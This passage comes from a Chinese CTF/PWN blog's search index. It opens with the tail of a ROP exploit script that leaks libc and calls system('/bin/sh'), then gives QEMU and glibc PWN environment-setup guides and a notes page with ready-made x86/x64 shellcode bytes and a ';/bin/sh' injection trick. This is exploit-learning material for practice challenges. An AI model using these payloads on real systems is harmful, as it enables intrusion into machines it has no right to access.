class="hljs-number">1</span>) <span class="hljs-comment"># puts(plt_got,0,0)</span><span class="hljs-comment"># 要注意csu中取的是x21中地址的值</span>pl+= p64(magic<span class="hljs-number">-0x10</span>) + p64(<span class="hljs-number">1</span>) + p64(write_got) + p64(<span class="hljs-number">0x20</span>)<span class="hljs-comment"># 第二轮</span><span class="hljs-comment"># 返回main函数</span>pl+= p64(magic) + p64(vul_addr)sa(<span class="hljs-string">&#x27;message:&#x27;</span>,pl)ru(<span class="hljs-string">&#x27;\n&#x27;</span>)write_addr = uu64(r(<span class="hljs-number">5</span>))base = write_addr - sym(<span class="hljs-string">&#x27;write&#x27;</span>)leak(base)system += baseleak(system) <span class="hljs-comment"># ----------------------------------------- 3 第二次rop 执行system(&#x27;/bin/sh&#x27;)</span>sla(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)pl = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>pl+= p64(magic+<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x400ad0</span>)pl+= p64(system).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + p64(<span class="hljs-number">0</span>) +<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe8</span>pl+= p64(magic) + p64(<span class="hljs-number">0x400ab0</span>)pl+= p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) pl+= p64(magic+<span class="hljs-number">0x70</span>) + p64(binsh) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)sa(<span class="hljs-string">&#x27;message:&#x27;</span>,pl)itr()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
      <category>异构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,PWN,异构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异构 PWN 0x1 环境搭建</title>
    <link href="/2020/11/11/%E5%BC%82%E6%9E%84%20PWN%200x1%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/11/11/%E5%BC%82%E6%9E%84%20PWN%200x1%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="异构-PWN-0x1-环境搭建"><a href="#异构-PWN-0x1-环境搭建" class="headerlink" title="异构 PWN 0x1 环境搭建"></a>异构 PWN 0x1 环境搭建</h1><blockquote><p>最近一个月各种干活，没能抽出固定的时间来学习   ) :</p><p>之前学习的笔记比较零散，最近准备抽时间全部整理到博客上</p><p>本文内容是异构环境的搭建和使用，参考了A1ex的博客</p><p><a href="https://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">https://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h3><pre><code class="hljs sh">sudo apt-get install qemu sudo apt-get install qemu-user-staticsudo apt-get install qemu-systemsudo apt-get install uml-utilitiessudo apt-get install bridge-utils</code></pre><h3 id="IDA-mipsrop插件"><a href="#IDA-mipsrop插件" class="headerlink" title="IDA mipsrop插件"></a>IDA mipsrop插件</h3><p>一款用于搜索mips中gadgets和function call的插件，下载地址如下</p><p><code>https://github.com/devttys0/ida/tree/master/plugins/mipsrop</code></p><p>但实际上该版本的mipsrop插件并不能在7.0中使用，需要下载旧版</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201111230421.png" alt="image-20201111230420992"></p><h3 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h3><p>NASA发布的逆向神器，支持mips的反编译，在主机上配置好java环境即可使用</p><h3 id="MIPS汇编指令学习"><a href="#MIPS汇编指令学习" class="headerlink" title="MIPS汇编指令学习"></a>MIPS汇编指令学习</h3><p><a href="https://www.cnblogs.com/CoBrAMG/p/9237609.html">https://www.cnblogs.com/CoBrAMG/p/9237609.html</a></p><h2 id="QEMU系统模式"><a href="#QEMU系统模式" class="headerlink" title="QEMU系统模式"></a>QEMU系统模式</h2><p>暂略</p><p><a href="https://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">https://a1ex.online/2020/10/09/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p><p>之前配置过，但目前用的比较少，听征哥说可以利用bulitroot直接编译出其他架构的linux内核，但还没来得及深入研究，等学习到linux内核再看吧</p><h2 id="QEMU用户模式"><a href="#QEMU用户模式" class="headerlink" title="QEMU用户模式"></a>QEMU用户模式</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><ul><li><p>用户模式配置更简单，也更常用，这里以32位mipsel程序为例，可以看到除了程序外还有其依赖的<code>.so</code>文件</p><p>  <img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201111233038.png" alt="image-20201111233038787"></p><p>  此时有三种方法可以运行程序</p></li></ul><h4 id="1-修改系统根目录"><a href="#1-修改系统根目录" class="headerlink" title="1. 修改系统根目录"></a>1. 修改系统根目录</h4><p>既然题目已经给了程序所依赖的库，那么我们直接将系统的根目录设定到题目所在目录，即可解决依赖问题</p><p>qemu的用户模式分为<code>qemu-user</code>和<code>qemu-user-static</code>, 其中后者是静态编译的, 本身不需要其他依赖库, 因此可以在此处使用(因为修改了系统根目录后原本的依赖会失效)</p><p>修改系统根目录可以通过<code>chroot</code>命令实现, 具体指令如下</p><p><code>sudo chroot . ./qemu-mipsel-static HelloMIPS</code>[需要提前将 qemu-mipsel-static放置在程序目录中]</p><h4 id="2-手动将依赖库放置到指定位置"><a href="#2-手动将依赖库放置到指定位置" class="headerlink" title="2. 手动将依赖库放置到指定位置"></a>2. 手动将依赖库放置到指定位置</h4><p>直接运行程序时,往往会出现以下错误信息</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201111235432.png" alt="image-20201111235432037"></p><p>我们只需要将题目所给的依赖库放入<code>/lib/</code>中,并修改为其指定的名字即可执行</p><h4 id="3-指定依赖库路径"><a href="#3-指定依赖库路径" class="headerlink" title="3. 指定依赖库路径"></a>3. 指定依赖库路径</h4><p>通过<code>qemu</code>的<code>-L</code>参数指定程序依赖库的路径</p><p><code>$ qemu-aarch64 -L .  HelloARM</code></p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201112001700.png" alt="image-20201112001659894"></p><h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><p>调试程序同样有三种方式,这里强推第三种</p><h4 id="1-使用socat挂载"><a href="#1-使用socat挂载" class="headerlink" title="1. 使用socat挂载"></a>1. 使用socat挂载</h4><p>使用socat命令挂载程序</p><p><code>socat tcp-l:10002,fork exec:&quot;qemu-mipsel -g 1234  -L . ./HelloMIPS&quot;,reuseaddr</code></p><p>此时<code>10002</code>为pwntools的端口</p><p><code>1234</code>为gdb的端口</p><p>在调试时,在pwntools脚本中加一个<code>pause</code>让程序暂停,紧接着打开gdb<code>gdb-multiarch HelloMIPS</code></p><p>之后使用指令<code>target remote 127.0.0.1</code>即可连上程序进行调试</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201112002446.png" alt="image-20201112002446047"></p><p>如果出现端口占用的情况， 需要通过指令杀死socat进程</p><p><code>killall socat</code></p><h4 id="2-在PWNTOOLS中使用指令挂载"><a href="#2-在PWNTOOLS中使用指令挂载" class="headerlink" title="2. 在PWNTOOLS中使用指令挂载"></a>2. 在PWNTOOLS中使用指令挂载</h4><p>第一种方法本质上是开了两个端口,一个用于pwntools脚本,一个用于gdb</p><p>但这样需要开3个终端,太麻烦了</p><p>因此我们直接在pwntools脚本中执行<code>qemu-mipsel -g 1234  -L . ./HelloMIPS</code>,然后 在通过gdb本地连接上, 这样只需要两个终端即可</p><p>代码如下:</p><pre><code class="hljs python">p = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;1234&quot;</span>,<span class="hljs-string">&quot;./HelloMIPS&quot;</span>])</code></pre><p>之后步骤同1一样</p><h4 id="3-在PWNTOOLS中通过gdb-debug的方法调试"><a href="#3-在PWNTOOLS中通过gdb-debug的方法调试" class="headerlink" title="3. 在PWNTOOLS中通过gdb.debug的方法调试"></a>3. 在PWNTOOLS中通过gdb.debug的方法调试</h4><p>第二种方法实际上已经比较完美了,但美中不足的是, 我们需要在脚本的开头设置一个<code>pause</code>, 然后在手动操作gdb连上去, 还是有点麻烦</p><p>有没有一种方法可以把这个过程自动化呢，其实是有的，其代码如下：</p><pre><code class="hljs python">context.binary = <span class="hljs-string">&#x27;HelloMIPS&#x27;</span>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]p = gdb.debug(context.binary.path)</code></pre><p>使用时和以上两种方法类似</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
      <category>异构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,PWN,异构,环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN NOTE</title>
    <link href="/2020/10/25/PWN%20NOTE/"/>
    <url>/2020/10/25/PWN%20NOTE/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN-NOTE"><a href="#PWN-NOTE" class="headerlink" title="PWN NOTE"></a>PWN NOTE</h1><blockquote><p>本文主要介绍PWN学习过程中的各种收获和笔记</p></blockquote><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><ul><li><p>搜索gadgets/搜索rop链：</p><ul><li><code>ROPgadget --binary a.out  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></li><li><code>ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39;   </code></li></ul></li><li><p>ropper <code>ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search &quot;syscall&quot;</code></p></li><li><p>在elf中搜索字符串：<code>ROPgadget --binary a.out  --string &#39;/bin/sh&#39;</code> </p></li><li><p>在ida中搜索字符串 <code>shift + F12</code></p></li><li><p>计算偏移量：</p><p> <code>cyclic 100</code> 生成有规律的字符串</p><p> <code>cyclic -l abcd</code> 根据返回值计算其所在位置</p><ul><li><p>编写exp时如果涉及到函数调用，要记得在调用函数和参数之间加返回值（可以是占位符），如：</p><p><code>payload = &#39;a&#39; * 112 + system_addr + &#39;aaaa&#39; + binsh_addr</code></p><p>这主要是因为我们通过栈溢出改变函数返回值的方式，其过程类似于执行了<code>call system</code>，但在执行call执行时，其内部会将下一个指令的地址入栈，待函数执行完毕后执行ret指令时，会从栈顶pop返回值。<u><strong>因此需要在修改的函数地址后面跟一个返回值，否则栈上构造的参数会被ret指令读取</strong></u></p></li><li><p>当遇到nx保护又想执行shellcode时，可以调用mprotect或mmap函数更改bss段的权限</p></li><li><p>查看程序符号表入口（可查看自定义名称的函数）<code> objdump -t level5</code></p></li><li><p>查看程序got表 <code>objdump -T level5</code></p></li><li><p>libc搜索网站和工具（搜索后12位）：LibcSearcher、DynELF、<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p></li><li><p>onegadget： 一个神奇的工具 用来找libc中能一个gadget就get到shell的偏移</p><p><code>one_gadget /lib/x86_64-linux-gnu/libc.so.6</code></p></li><li><p>没有开启PIE时，64位程序从0x400000开始</p></li><li><p>翻译汇编：<br><code>sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)</code></p></li><li><p>一种调试方法：</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DEBUG</span>(<span class="hljs-params">cmd</span>):</span>raw_input(<span class="hljs-string">&quot;DEBUG: &quot;</span>)gdb.attach(io, cmd) DEBUG(<span class="hljs-string">&#x27;b *0x1234 \n c&#x27;</span>) <span class="hljs-comment">#在0x123处下断点，然后继续执行至断点处</span></code></pre></li><li><p>byte ptr [eax]</p><p>以eax为地址，取一个字节的数据，并扩展到32位</p></li><li><p>retn指令 = pop eip 将栈上的地址赋值给eip</p></li><li><p>调试开启PIE的程序：</p><ul><li><p>下断点：</p><p>pwndbg&gt; b main (首先在main处下断点，让程序跑起来)</p></li></ul><p>pwndbg&gt; b *$rebase(0xAAAA)</p><ul><li><p>查看内存：</p><p>pwndbg&gt; x/xg $rebase(0xAAAA)</p></li></ul></li></ul></li><li><p>gdb</p><ul><li>字符串 x/s 0xxxx</li><li>指令 x/i 0xxxx</li></ul></li><li><p>ida注释</p><ul><li>汇编指令注释：’;’</li><li>伪代码注释：’/‘</li></ul></li><li><p>字符串格式化漏洞算偏移</p><ul><li>fmtarg + 栈上地址</li></ul></li><li><p>在vscode中开启 pwntools gdb调试</p><ul><li><p>原来的代码是直接attach调用：</p><pre><code class="hljs python">p = process(<span class="hljs-string">&#x27;./dice_game&#x27;</span>)gdb.attach(p)</code></pre><p>现在修改为：</p><pre><code class="hljs python">p = process(<span class="hljs-string">&#x27;./dice_game&#x27;</span>)context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]gdb.attach(proc.pidof(p)[<span class="hljs-number">0</span>],gdbscript=<span class="hljs-string">&quot;b main&quot;</span>)</code></pre><ul><li>运行脚本的时候，先配置tmux：</li><li>tmux set mouse on （设定鼠标滚动支持）</li><li>再执行 tmux<br><img src="https://img-blog.csdnimg.cn/20200531222930988.png" alt="在这里插入图片描述"></li></ul><p>再输入python exploit.py，**[^记得务必在tmux下执行脚本]** ，然后就可以发现使用gdb进行debug了，整个命令行界面分为一左一右两部分。</p></li></ul></li></ul><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><ul><li>64位短shellcode<ul><li><code>\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</code>(24字节)</li></ul></li><li>32位短shellcode<ul><li><code>shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</code>(23字节)</li></ul></li></ul><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><ul><li><p>去除pwn题中alarm函数</p><ul><li><code>sed -i s/alarm/isnan/g ./xxx</code></li></ul></li><li><p>泄露栈地址的方法</p><ul><li>首先通过<code>__libc_start_main</code>,<code>puts</code>等获得libc基址</li><li>之后通过泄露<code>_environ + base</code>获得栈地址</li></ul></li><li><p>32和64位下各类型变量长度</p><ul><li><p>64位</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20200927133147.png" alt="image-20200927133147655"></p></li><li><p>32位</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20200927133249.png" alt="image-20200927133249402"></p></li></ul></li><li><p>system(‘/bin/sh’) == system(‘asdasdsdas;/bin/sh’)</p><ul><li><code>;</code>会截断system的参数，因此可以使诸如<code>sadjljashd;/bin/sh</code>的字符串成功get shell</li></ul></li><li><p>gdb使用特定格式查看内存</p><ul><li><p><code>pwndbg&gt; p *(const struct _IO_jump_t *) IO_2_1_stdout.vtable</code></p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201001210525.png" alt="在这里插入图片描述"></p></li><li><p>查看关键的结构体指针</p><p><code>p _IO_str_jumps</code></p><p>其他指针也可以查看，直接补全即可</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201105150459.png" alt="img"></p></li></ul></li><li><p>开启沙箱保护的特征：</p><ul><li>存在seccomp 或 prctl函数<ul><li>可以用seccomp-tools查看保护</li><li><code>seccomp-tools dump ./one_punch</code></li></ul></li></ul></li><li><p>在本地部署pwn题调试</p><p>安装 socat</p><pre><code class="hljs sh">$ sudo apt-get install socat</code></pre><p>模板：<code>socat tcp-listen:port,fork exec:./程序名,reuseaddr</code></p><p>实例：<code>socat tcp-listen:10001,fork exec:./pwn1,reuseaddr</code></p></li></ul><p>glibc源码调试</p><ul><li><p>下载源码<code>http://ftp.gnu.org/gnu/glibc/</code></p></li><li><p>打开gdb</p><p>使用<code>dir</code>指令加载源码,例如:</p><p><code>dir ~/pwn/others/source/glibc-2.27/malloc/</code></p><p>下断点:</p><ul><li><p>普通断点</p><p><code>b free</code></p></li><li><p>在源码中下断点[在malloc.c的22行下断点]</p><p><code>b malloc.c:22</code></p></li></ul></li><li><p>常规调试要加载的源码</p><ul><li><p>IO_file</p><p><code>dir ~/pwn/others/source/glibc-2.27/io</code></p><p><code>dir ~/pwn/others/source/glibc-2.27/libio</code></p></li><li><p>堆</p><p><code>dir ~/pwn/others/source/glibc-2.27/malloc/</code></p></li></ul></li><li><p>32位程序Canary位置：<code>$ebp - 0xc</code></p></li></ul><h2 id="关于-x00"><a href="#关于-x00" class="headerlink" title="关于\x00"></a>关于\x00</h2><ul><li>会在末尾加\x00的函数<ul><li>sprintf</li><li>scanf (%s时)</li><li>gets</li></ul></li><li>不会再末尾加\x00的函数<ul><li>read</li></ul></li></ul><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="fini-array劫持"><a href="#fini-array劫持" class="headerlink" title="fini_array劫持"></a>fini_array劫持</h3><ul><li>和csu类似，在main函数结束后执行</li><li>可栈迁移，可ROP控制程序流执行</li><li><a href="https://www.freebuf.com/articles/system/226003.html">https://www.freebuf.com/articles/system/226003.html</a></li></ul><h4 id="查找fini-arry"><a href="#查找fini-arry" class="headerlink" title="查找fini_arry"></a>查找fini_arry</h4><ul><li><p>使用readelf</p><p><code>readelf -S xxx</code></p></li><li><p>IDA</p><p><code>Ctrl + s</code></p></li></ul><h3 id="在Bss段上的格式化字符串漏洞"><a href="#在Bss段上的格式化字符串漏洞" class="headerlink" title="在Bss段上的格式化字符串漏洞"></a>在Bss段上的格式化字符串漏洞</h3><ul><li>在栈中找到一个稳定的参数（栈地址中存放的数据为另一个栈地址）</li><li>通过两次修改，更改BSS段上地址</li></ul><h2 id="VSCODE快捷键"><a href="#VSCODE快捷键" class="headerlink" title="VSCODE快捷键"></a>VSCODE快捷键</h2><ul><li>选中当前单词<ul><li>CTRL + D</li><li>CTRL + SHIFT + RIGHT/LEFT</li><li>双击鼠标</li></ul></li><li>多行编辑<ul><li>ALT + 鼠标左键</li><li>CTEL + ALT + 方向键</li><li>移动当前行 ALT + 方向键</li></ul></li><li>终端<ul><li>开启终端： Ctrl + `</li><li>终端最大化： CapsLock + `</li></ul></li><li>重构代码<ul><li>跳转到定义处： F12</li><li>列出所有引用： Shift + F12</li><li>重命名变量： F2</li><li>替换所有匹配文本： CTRL + F2</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,PWN,Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Glibc PWN 0x1 环境搭建</title>
    <link href="/2020/10/24/Glibc%20PWN%200x1%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/10/24/Glibc%20PWN%200x1%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Glibc-PWN-0x1-环境搭建"><a href="#Glibc-PWN-0x1-环境搭建" class="headerlink" title="Glibc PWN 0x1 环境搭建"></a>Glibc PWN 0x1 环境搭建</h1><blockquote><p>本文主要介绍Linux  Gibc PWN的环境搭建</p></blockquote><h2 id="系统选择"><a href="#系统选择" class="headerlink" title="系统选择"></a>系统选择</h2><ul><li><p>虚拟机环境：Ubuntu16.04</p><p>选用Ubuntu16.04的主要原因是方便进行堆入门</p></li></ul><h2 id="必备软件"><a href="#必备软件" class="headerlink" title="必备软件"></a>必备软件</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><ul><li><p>和正常的ubuntu一样，首先修改系统的源，这里使用的是清华的源：<br><a href="https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/</a></p></li><li><p>依次执行下面的命令：</p><pre><code class="hljs sh">   $ <span class="hljs-built_in">cd</span> /etc/apt   <span class="hljs-comment"># 保存原始的sources.list文件</span>   $ cp sources.list sources.list.bak   $ apt-get update   <span class="hljs-comment"># 安装编辑文本的工具</span>   $ apt-get install vim   <span class="hljs-comment"># 更换源之后采用https协议，需要安装该软件才行</span>   $ apt-get install apt-transport-https   <span class="hljs-comment"># 安装ca-certificates</span>   $ apt-get install ca-certificates   <span class="hljs-comment"># 覆盖原始的内容</span>   $ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> &gt; sources.list   <span class="hljs-comment"># 将清华的源拷贝进去(Ctrl+Shift+v)保存</span>   $ vim sources.list<span class="hljs-comment"># 更新源</span>   $ apt-get update</code></pre></li></ul><h3 id="安装必备软件"><a href="#安装必备软件" class="headerlink" title="安装必备软件"></a>安装必备软件</h3><ul><li><p>tmux</p>  <pre><code class="hljs sh">sudo apt-get install tmux<span class="hljs-comment"># 设置开启终端自动进入tmux</span><span class="hljs-built_in">cd</span> ~vim .bashrc<span class="hljs-comment"># 在最底端添加</span>tmux<span class="hljs-comment"># 设置滚轮控制</span>$ <span class="hljs-built_in">cd</span> ~$ touch .tmux.conf$ vim .tmux.conf <span class="hljs-comment"># 添加</span><span class="hljs-built_in">set</span> -g mouse on</code></pre></li></ul><ul><li><p>VIM Make Cmake Git</p>  <pre><code class="hljs sh"><span class="hljs-comment"># VIM 编辑器</span>$ sudo apt-get install vim<span class="hljs-comment"># make</span>$ sudo apt-get install make<span class="hljs-comment"># cmake</span>$ sudo apt-get install cmake<span class="hljs-comment"># git</span>$ sudo apt-get install git</code></pre></li><li><p>安装Proxychains</p><pre><code><pre><code class="hljs sh">  $ sudo apt install proxychains  <span class="hljs-comment"># 配置proxychains</span>  $ sudo vim /etc/proxychains.conf  <span class="hljs-comment"># 在proxychains.conf文件末尾修改你的socks5服务地址</span>[ProxyList]socks5  127.0.0.1 1080  <span class="hljs-comment"># 使用(此方法只能代理TCP链接) 在命令之前加上 proxychains 即可使用</span><span class="hljs-comment"># sudo proxychains pip install &lt;package_name&gt;</span></code></pre></code></pre></li><li><p>安装ssh</p><pre><code><pre><code class="hljs sh"><span class="hljs-comment"># 安装ssh服务</span>$ sudo apt-get install openssh-server<span class="hljs-comment"># 重启ssh服务</span>$ sudo service ssh restart<span class="hljs-comment"># 配置ssh免密登陆</span>1. 打开本地存放ssh秘钥对的文件C:\Users\用户名\.ssh 2. 复制 id-rsa.pub 中内容 3. 在ubuntu中新建如下文件vim /用户目录的绝对路径/.ssh/authorized_keys 4. 将公钥内容写入authorized_keys中</code></pre></code></pre></li><li><p>安装x86环境</p><pre><code><pre><code class="hljs sh">$ sudo apt-get install libc6-dev-i386$ sudo dpkg --add-architecture i386$ sudo apt-get update$ sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 zlib1g:i386$ sudo apt-get install lib32ncurses5 $ sudo apt-get install lib32z1</code></pre></code></pre></li></ul><h3 id="安装-Linux-Glibc-Pwn常用软件"><a href="#安装-Linux-Glibc-Pwn常用软件" class="headerlink" title="安装 Linux Glibc Pwn常用软件"></a>安装 Linux Glibc Pwn常用软件</h3><h4 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h4><p>一个CTF框架和漏洞利用开发库，用Python开发， 必备神器，安装方法如下：</p><ul><li><p>Python3环境安装</p>  <pre><code class="hljs sh">$ sudo apt-get update$ sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential$ sudo pip3 install pwntools</code></pre></li><li><p>Python2 环境安装     </p>  <pre><code class="hljs sh">$ sudo apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential$ sudo pip install pwntools</code></pre></li></ul><h4 id="Pwndbg-amp-Pwngdb"><a href="#Pwndbg-amp-Pwngdb" class="headerlink" title="Pwndbg &amp; Pwngdb"></a>Pwndbg &amp; Pwngdb</h4><p>动态调试必备神器<br><code>$ sudo apt-get install gdb</code></p><pre><code class="hljs sh"><span class="hljs-comment"># 安装pwngdb</span>$ <span class="hljs-built_in">cd</span> ~/$ git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git $ cp ~/Pwngdb/.gdbinit ~/<span class="hljs-comment"># 安装pwndbg</span><span class="hljs-variable">$git</span> <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg$ <span class="hljs-built_in">cd</span> pwndbg$ ./setup.sh     <span class="hljs-comment"># 联合使用</span>$ vim ~/.gdbinit然后写入<span class="hljs-string">&quot;source ~/pwndbg/gdbinit.py&quot;</span></code></pre><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201009131438.png" alt="pwndbg"></p><h4 id="libc-database"><a href="#libc-database" class="headerlink" title="libc-database"></a>libc-database</h4><p>根据泄露数据查找libc库版本的库，安装方法如下：</p><pre><code class="hljs sh">$ git <span class="hljs-built_in">clone</span> https://github.com/niklasb/libc-database.git</code></pre><h4 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h4><p>根据泄露数据查找libc库版本的库，省时，安装方法如下：</p><pre><code class="hljs sh">$ git <span class="hljs-built_in">clone</span> https://github.com/lieanu/LibcSearcher.git$ <span class="hljs-built_in">cd</span> LibcSearcher$ python setup.py develop$ python3 setup.py develop <span class="hljs-comment"># 安装python3版</span></code></pre><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><pre><code class="hljs sh">$ sudo pip install capstone$ pip install ropgadget$ ROPgadget</code></pre><h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h4><pre><code class="hljs sh">$ sudo apt install ruby$ apt-get install gem$ gem install one_gadget</code></pre><h4 id="Ropper"><a href="#Ropper" class="headerlink" title="Ropper"></a>Ropper</h4><pre><code class="hljs sh">$ sudo pip install setuptools --upgrade$ sudo pip install capstone$ sudo pip install filebytes$ sudo pip install keystone-engine$ sudo pip install ropper$ sudo pip install pyvex</code></pre><h4 id="Seccomp-Tools"><a href="#Seccomp-Tools" class="headerlink" title="Seccomp Tools"></a>Seccomp Tools</h4><pre><code class="hljs sh">$ sudo apt install gcc ruby-dev$ gem install seccomp-tools</code></pre><h4 id="Qira"><a href="#Qira" class="headerlink" title="Qira"></a>Qira</h4><p>一个可以显示程序各个时间点堆栈结构的调试工具</p><ul><li><p>安装<br>  <code>cd ~/ &amp;&amp; wget -qO- https://github.com/geohot/qira/archive/v1.3.tar.gz | tar zx &amp;&amp; cd qira-1.3 &amp;&amp; ./install.sh</code></p></li><li><p>用法：<br>  <code>qira -s ./a.out</code>  之后使用 <code>nc localhost 4000</code>即可连接题目，同时调试信息会实时更新在3002端口，可直接在主机上用虚拟机的IP访问，比如我这边的网址就是<code>http://192.168.25.129:3002/</code><br>  同时qira还自带一个ida插件，但我还没开始研究<br>   <img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20200706215104.png" alt="img"></p></li></ul><h3 id="异构环境"><a href="#异构环境" class="headerlink" title="异构环境"></a>异构环境</h3><h4 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h4><pre><code class="hljs sh">$ sudo apt-get install qemu $ sudo apt-get install qemu-user-static$ sudo apt-get install qemu-system$ sudo apt-get install uml-utilities$ sudo apt-get install bridge-utils</code></pre><h4 id="gdb-mutiarch"><a href="#gdb-mutiarch" class="headerlink" title="gdb-mutiarch"></a>gdb-mutiarch</h4><pre><code class="hljs sh">$ sudo apt-get install gdb-multiarch</code></pre><h4 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h4><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git<span class="hljs-built_in">cd</span> binwalk$ sudo python setup.py install$ sudo apt-get install python-lzma$ sudo pip install nose coverage$ sudo apt-get install python-crypto$ sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip$ sudo pip install pyqtgraph$ sudo apt-get install python-pip$ sudo pip install capstone$ sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord$ sudo ./deps.sh</code></pre><h4 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h4><pre><code class="hljs sh">$ sudo apt install gcc build-essential bison flex gettext tcl sharutils libncurses-dev zlib1g-dev exuberant-ctags g++ texinfo patch vim libtool bc git<span class="hljs-comment"># 从该网址中下载buildroot</span>https://buildroot.org/download.html</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PWN</category>
      
      <category>Glibc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,PWN,Glibc,环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
